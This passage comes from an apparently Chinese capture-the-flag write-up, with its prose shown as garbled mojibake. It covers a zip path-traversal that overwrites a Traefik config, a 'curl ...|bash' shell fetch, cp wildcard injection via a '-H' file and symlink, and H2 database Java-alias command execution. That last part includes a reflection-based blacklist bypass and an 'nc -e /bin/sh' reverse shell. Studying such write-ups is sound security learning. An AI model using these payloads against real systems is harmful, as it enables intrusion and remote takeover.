fileInArchive.Close()<br><br>_, err = io.Copy(outFile, fileInArchive)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipFile</span><span class="hljs-params">(zipPath, destDir <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>zipReader, err := zip.OpenReader(zipPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> zipReader.Close()<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> zipReader.File &#123;<br>filePath := filepath.Join(destDir, file.Name)<br><span class="hljs-keyword">if</span> file.FileInfo().IsDir() &#123;<br><span class="hljs-keyword">if</span> err := os.MkdirAll(filePath, file.Mode()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = unzipSimpleFile(file, filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randFileName</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> uuid.New().String()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br><br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>xForwardedFor := c.GetHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br><br><span class="hljs-keyword">if</span> !strings.Contains(xForwardedFor, <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;only localhost can get flag&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>flag := os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;&quot;</span> &#123;<br>flag = <span class="hljs-string">&quot;flag&#123;testflag&#125;&quot;</span><br>&#125;<br><br>c.String(http.StatusOK, flag)<br>&#125;)<br><br>r.GET(<span class="hljs-string">&quot;/public/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;)<br><br>r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>randomFolder := randFileName()<br>destDir := filepath.Join(uploadDir, randomFolder)<br><br><span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error unzipping file:&quot;</span>, err)<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>&#125;)<br>&#125;)<br><br>r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>çœ‹æºç å¥½åƒè¿˜æ˜¯æŒºç®€å•çš„å§ï¼Œåªè¦<code>xff</code>è®¿é—®<code>/flag</code>å°±è¡Œï¼Œä½†æ˜¯çœ‹é…ç½®æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dynamic configuration</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†åå‘ä»£ç†åªè¦è®¿é—®<code>/public/index</code>å’Œ<code>/public/upload</code>çš„æµé‡æ‰ä¼šä¼ ç»™æœåŠ¡å™¨è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ‰“å¼€å®¹å™¨å°±æ˜¯404çš„åŸå› </p><p>æˆ‘ä»¬å†æ¥åˆ†ææºç ï¼Œçœ‹è§åªè®©ä¸Šä¼ å‹ç¼©åŒ…ï¼Œè¿˜ä¼šè§£å‹ï¼ŒéªŒè¯æ–¹å¼ä¹Ÿæ˜¯ä½¿ç”¨çš„<code>archive/zipæ¨¡å—</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png" alt="image-20250209210831989"></p><p>é‚£æˆ‘ä»¬å¯ä»¥å°è¯•zipè§£å‹å¯¼è‡´<strong>ä»»æ„æ–‡ä»¶è¦†ç›–</strong></p><p>æˆ‘ä»¬çœ‹ä¸‹ä»–çš„ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/                                      <span class="hljs-comment"># æ ¹ç›®å½•</span><br>â”œâ”€â”€ /traefik                           <span class="hljs-comment"># Traefik äºŒè¿›åˆ¶æ–‡ä»¶</span><br>â”œâ”€â”€ /src                                <span class="hljs-comment"># é¡¹ç›®çš„æºä»£ç ç›®å½•(åˆ åˆ°äº†)</span><br>â”œâ”€â”€ /app                                <span class="hljs-comment"># åº”ç”¨ç›®å½•ï¼ŒåŒ…å«æ„å»ºåçš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶</span><br>â”‚   â”œâ”€â”€ /main                          <span class="hljs-comment"># ç”Ÿæˆçš„ Go äºŒè¿›åˆ¶æ–‡ä»¶</span><br>â”‚   â”œâ”€â”€ /uploads                       <span class="hljs-comment"># ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨ç›®å½•</span><br>â”‚   â”œâ”€â”€ /templates                     <span class="hljs-comment"># åº”ç”¨æ¨¡æ¿ç›®å½•</span><br>â”‚   â””â”€â”€ /.config                        <span class="hljs-comment"># é…ç½®æ–‡ä»¶ç›®å½•</span><br>â”‚       â”œâ”€â”€ /dynamic.yml               <span class="hljs-comment"># åŠ¨æ€é…ç½®æ–‡ä»¶</span><br>â”‚       â””â”€â”€ /traefik.yml               <span class="hljs-comment"># Traefik é…ç½®æ–‡ä»¶</span><br>â”œâ”€â”€ /run.sh                             <span class="hljs-comment"># å¯åŠ¨è„šæœ¬</span><br></code></pre></td></tr></table></figure><p>è¿˜å‘ç°æ¯æ¬¡è®¿é—®éƒ½ä¼šåŠ è½½<code>templates/index.html</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¦†ç›–ä»–å†™ä¸€ä¸ªxssæ‹¿åˆ°flagå¯¹ä¸å¯¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, &#123; <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &#125; &#125;)<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = data; &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ ä¹Ÿè¿™ä¹ˆæƒ³ï¼Œé‚£ä½ å°±é”™äº†ï¼Œé”™åœ¨å“ª</p><ol><li></li></ol><blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -h /dev/null ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /app/uploads &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> ctf:ctf -R /app/.config /app/uploads </span><br></code></pre></td></tr></table></figure><p>çœ‹dockerfileå¯ä»¥å‘ç°æˆ‘ä»¬å¯¹<code>templates</code>æ–‡ä»¶å¤¹å¹¶æ²¡æœ‰æƒé™ï¼Œæ— æ³•è¿›è¡Œå†™å…¥ï¼Œï¼ˆåœ¨æœ¬åœ°æµ‹äº†å¥½ä¹…éƒ½å¯ä»¥ï¼Œä½†æ˜¯ä¸Šä¼ å¹³å°ä¸æˆåŠŸ)</p></blockquote><ol start="2"><li></li></ol><blockquote><p>ä½¿ç”¨çš„æ˜¯åå‘ä»£ç†ï¼Œxssè„šæœ¬çš„headerå°±æ— æ•ˆäº†</p></blockquote><p>æ‰€æœ‰æˆ‘ä»¬å¾—è¦†ç›–é…ç½®æ–‡ä»¶ï¼Œè¦†ç›–è¿™ä¸ªåŠ¨æ€é…ç½®æ–‡ä»¶</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png" alt="image-20250209212939429"></p><p>é¦–å…ˆæˆ‘ä»¬å‡†å¤‡å¥½é…ç½®æ–‡ä»¶è„šæœ¬</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">forwardedHeaders:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;&#123;127.0.0.1&#125;&quot;</span><br><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br></code></pre></td></tr></table></figure><p>å‘½åä¸º<code>..1..1.config1dynamic.yml</code>(æ–‡ä»¶åä¸èƒ½æœ‰<code>/</code>æš‚æ—¶ç”¨<code>1</code>ä»£æ›¿)</p><p>å°†ä»–å‹ç¼©ï¼Œæ‹¿åˆ°notepad++ï¼ˆwinhexä¹Ÿè¡Œï¼‰æ‰“å¼€</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png" alt="image-20250209213519539"></p><p>æŠŠ<code>1</code>æ¢æˆ<code>/</code>ï¼Œæœ‰ä¸¤å¤„éƒ½è¦æ¢ä¸Š</p><p>ä¸Šä¼ å¹³å°ï¼Œåœ¨è®¿é—®&#x2F;flagå°±å¯ä»¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png" alt="image-20250209213900279"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œå‘œå‘œå‘œï¼Œåˆšè¿›å»å®Œå…¨ä¸çŸ¥é“è¦å¹²å˜›ï¼Œç¬¬ä¸€æ¬¡çœ‹æºç ä¹Ÿæ²¡ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæµ…æµ…çš„ç¿»äº†ä¸€ä¸‹ï¼Œç¬¬äºŒå¤©å†çœ‹çš„æ—¶å€™æ‰å†æœ€ä¸‹é¢æ‰¾åˆ°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>æˆ‘ä»¬ç›´æ¥å†ä¸Šä¼ <code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>æˆåŠŸæ‹¿åˆ°shell</p><p>æŸ¥çœ‹æ ¹ç›®å½•å‘ç°æœ‰flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><p>å°è¯•suidææƒä½†æ˜¯æ²¡æœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>çœ‹ä¸€ä¸‹<code>ps -ef</code>çœ‹çœ‹æ‰§è¡Œäº†ä»€ä¹ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>å‘å…ˆæ‰§è¡Œäº†<code>/start.sh</code>å’Œ<code>backup.sh</code></p><p>startæ²¡æœ‰æƒé™çœ‹ä¸äº†ï¼Œé‚£å°±çœ‹backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å‘ç°ä»–ä¼šä¸€ç›´æ‰§è¡Œï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯ç¯å¢ƒå˜é‡åŠ«æŒsleepå‡½æ•°è®©ä»–æ‰§è¡Œ<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>å†<code>export PATH=/tmp:$PATH</code>å†åˆ›å»ºä¸€ä¸ª<code>/tmp/sleep</code>ä¸º<code>cat /flag &gt; /var/www/html/backup/1</code>ç»™æƒé™</p><p>æˆ‘è‡ªå·±å°è¯•ä¼šæ‰§è¡Œ<code>/tem/sleep</code>ä½†ç”±äºæ²¡æœ‰æƒé™å°±æ˜¯ç©ºæ–‡ä»¶ï¼Œä½†æ˜¯backp.shä¸ä¼šæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>åæ¥å‘ç°<code>backup.sh</code>ä½¿ç”¨äº†é€šé…ç¬¦<code>*</code>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å†æ–‡ä»¶åä¸Šä¸‹æ‰‹</p><p>åˆšåˆšå¥½cpæœ‰ä¸€ä¸ªå‚æ•°<code>-H</code>å¯ä»¥è®©è½¯é“¾æ¥ä¹Ÿè¢«å¤åˆ¶</p><p>é‚£ä¹ˆå°±å¯ä»¥å®ç°</p><p>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  ä¸æ˜¯å¸¸è§„æ–‡ä»¶åä¸å¯ä»¥ç”¨<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>ç„¶åç­‰ä¸€ä¼šå‘ç°<code>/backup</code>æ–‡ä»¶å¤¹ä¸­æœ‰1</p><p>å†è¯»å–1æ‹¿åˆ°flag</p><h2 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h2><p>çœŸçš„easyå—ï¼Œå‘œå‘œå‘œï¼Œæºç åˆ†æå¾—åˆ°æ•°æ®åº“æ˜¯<code>h2</code>æ•°æ®åº“ï¼Œæœ‰ä¸€ä¸ªè´¦å·</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">passwd:</span>admin<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼Œè€Œä¸”flagè¦é€šè¿‡&#x2F;readflagè¯»å–ï¼Œå•çº¯sqlæ˜¯æ‹¿ä¸åˆ°é«˜shellçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¦å¯»ä»–æ³•</p><p>ä¸Šç½‘æŸ¥åˆ°h2æ•°æ®åº“å¯ä»¥æ‰§è¡Œjavaä»£ç ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œèƒ½</p><p>ç½‘ä¸Šä¸‹è½½äº†h2æ•°æ®åº“æœ¬åœ°éƒ¨ç½²</p><p>å†™ä¸€ä¸ªJavaå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS exec_cmd; CREATE ALIAS exec_cmd AS <span class="hljs-string">&#x27;String rce() throws java.io.IOException &#123;</span><br><span class="hljs-string">    java.util.Scanner cmd_output = new java.util.Scanner(Runtime.getRuntime().exec(&quot;ls&quot;).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="hljs-string">    return cmd_output.hasNext() ? cmd_output.next() : &quot;&quot;;</span><br><span class="hljs-string">&#125;&#x27;</span>; CALL <span class="hljs-title function_">exec_cmd</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>å‘ç°ç¡®å®å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png" alt="image-20250210224050126"></p><p>ä½†æ˜¯å­˜åœ¨é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡Javaçš„åå°„æœºåˆ¶æ”¹å†™ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS RCE;<br>CREATE ALIAS RCE AS $$ <br>String <span class="hljs-title function_">rce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123; <br>  <span class="hljs-type">byte</span>[] classNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodName2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;; <br>  <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./readflag&quot;</span>; <br>  Class&lt;?&gt; clazz = java.lang.Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(classNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodName2), String.class); <br>  method2.invoke(method1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;payload&#125;); <br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Exploited&quot;</span>; <br>&#125; $$;CALL <span class="hljs-title function_">RCE</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸Šä¼ ä¹‹å</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png" alt="c7896c977a222bee80520fb8f7e7cb58"></p><p>åªæ˜¯è¿™æ ·æ²¡æœ‰å›æ˜¾ï¼Œåé¢è¯•äº†å¥½ä¹…æ˜¯ï¼Œè¦ä¸å°±æ˜¯500</p><p>åˆå»ç½‘ä¸Šæ‰¾äº†ä¸‹æ‰¾åˆ°<a href="https://www.cnblogs.com/F12-blog/p/18144377">è¿™ç¯‡æ–‡ç« </a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png" alt="image-20250210233304791"></p><p>ä¸Šä¼ æ¶æ„sqlæ–‡ä»¶ï¼Œå†æ§åˆ¶jdbc urlæŒ‡å‘ä»–</p><p>é‚£å°±ä¸è¦è¿‡æ»¤äº†ï¼Œç›´æ¥å†™java</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS RCE <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;String rce(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;1&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">CALL</span> RCE (<span class="hljs-string">&#x27;nc ip 32771 -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>python3 -m http.server 